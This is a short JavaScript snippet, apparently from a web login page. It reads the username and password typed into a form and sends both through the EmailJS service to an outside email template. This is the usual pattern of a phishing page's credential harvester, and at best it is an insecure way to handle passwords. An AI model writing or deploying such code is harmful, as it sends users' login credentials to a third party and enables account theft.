    function SendMail() {
    var params = {
        username_id : document.getElementById("username_id1").value, 
        password_id : document.getElementById("password_id1").value

    }
    emailjs.send("service_j78up1p", "template_0p14zoo", params).then(function(res){
        alert("success!" + res.status);
    })

}
